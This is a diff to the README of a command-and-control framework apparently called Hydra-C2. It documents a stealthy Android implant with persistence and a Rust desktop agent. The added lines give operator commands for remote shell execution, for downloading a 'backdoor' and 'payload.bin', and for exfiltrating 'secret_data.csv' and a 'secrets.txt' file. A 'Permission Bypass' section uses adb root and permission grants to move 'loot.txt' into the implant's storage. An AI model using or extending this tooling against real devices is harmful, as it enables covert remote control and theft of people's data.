@@ -10,7 +10,6 @@
 
 
 ```
-
 **Project Hydra-C2 is a multi-headed C2 (Command and Control) framework.**
 
 ---
@@ -62,9 +61,10 @@ A stealthy background service built with **Kotlin**.
 * **Vitals Reporting:** Real-time Battery percentage and OS version tracking.
 * **Persistence:** Foreground Service with a `NotificationChannel` and `WakeLock`.
 * **Action Execution:** Trigger hardware actions (e.g., Vibrator) via C2.
+* **File Operations:** Full support for file exfiltration and payload ingestion.
 * **Path:** `/hydra_android/`
 
-### 💻 Desktop Head 
+### 💻 Desktop Head
 
 A high-performance, lightweight agent built with **Rust**.
 
@@ -122,21 +122,51 @@ python commander.py DESKTOP-HEAD-ALPHA shell "whoami && uptime"
 python commander.py ANDROID-HEAD-01 vibrate 2500
 
 ```
-**File Download (Infiltrate)(Desktop):**
+
+**File Download (Infiltrate)(Desktop/Android):**
+
 ```bash
 python commander.py DESKTOP-HEAD-ALPHA download backdoor.txt
+python commander.py ANDROID-HEAD-01 download payload.bin
 
 ```
 
-**File Upload (Exfiltrate)(Desktop):**
+**File Upload (Exfiltrate)(Desktop/Android):**
+
 ```bash
 python commander.py DESKTOP-HEAD-ALPHA upload secret_data.csv
+python commander.py ANDROID-HEAD-01 upload /data/user/0/com.hydra.client/files/secrets.txt
 
 ```
 
 **Send system Message (Desktop/Android):**
+
 ```bash
 python commander.py DESKTOP-HEAD-ALPHA msg "System update starting..."
+
+```
+
+---
+
+## 🔧 Troubleshooting & Performance (Arch Linux)
+
+### 🖥 GPU & Emulator Stability
+
+On machines with AMD Vega/Integrated graphics, use **SwiftShader (CPU)** to avoid "Broken Pipe" or "Write Lock" crashes:
+
+```bash
+/opt/android-sdk/emulator/emulator -avd HydraTester -gpu swiftshader_indirect -no-snapshot-load -no-audio
+
+```
+
+### 🔐 Permission Bypass
+
+If exfiltration fails with `EACCES (Permission denied)`, use ADB to elevate the agent's permissions or move files to the private internal directory:
+
+```bash
+adb root
+adb shell pm grant com.hydra.client android.permission.READ_EXTERNAL_STORAGE
+adb shell "mv /sdcard/Download/loot.txt /data/user/0/com.hydra.client/files/loot.txt"
 
 ```
 
